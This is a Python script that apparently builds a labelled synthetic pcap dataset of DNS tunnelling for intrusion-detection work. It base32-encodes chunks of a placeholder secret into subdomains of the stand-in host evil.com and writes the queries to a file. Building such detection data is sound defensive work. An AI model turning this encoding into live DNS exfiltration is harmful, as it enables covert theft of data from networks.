import random
import os
import time
import base64
from scapy.all import IP, UDP, DNS, DNSQR
from common import save_pcap_and_labels, get_base_labels

def generate_dns_tunnel(src_ip, dns_server, base_domain="evil.com", num_queries=20):
    packets = []
    labels = get_base_labels("DNS_TUNNELLING", "Simulated DNS tunnelling via encoded subdomains")
    
    current_time = time.time()
    payload = "exfiltrated_secret_data_that_needs_to_be_split_" * 5
    
    # Split payload into chunks to fit in subdomain labels
    chunks = [payload[i:i+30] for i in range(0, len(payload), 30)]
    
    for chunk in chunks:
        current_time += random.uniform(0.1, 1.0)
        encoded_chunk = base64.b32encode(chunk.encode()).decode().lower().replace("=", "")
        
        qname = f"{encoded_chunk}.{base_domain}"
        
        src_port = random.randint(10000, 60000)
        
        pkt = IP(src=src_ip, dst=dns_server) / UDP(sport=src_port, dport=53) / DNS(rd=1, qd=DNSQR(qname=qname))
        pkt.time = current_time
        
        packets.append(pkt)
        
        labels["flows"].append({
            "src_ip": src_ip,
            "dst_ip": dns_server,
            "src_port": src_port,
            "dst_port": 53,
            "protocol": "UDP",
            "is_attack": True,
            "timestamp": pkt.time,
            "qname": qname
        })
        
    return packets, labels

if __name__ == "__main__":
    src = "10.0.0.50"
    dns_server = "8.8.8.8"
    pkts, lbls = generate_dns_tunnel(src, dns_server)
    save_pcap_and_labels("dns_tunnel.pcap", pkts, lbls, out_dir=os.path.join(os.path.dirname(__file__), "../../data/"))
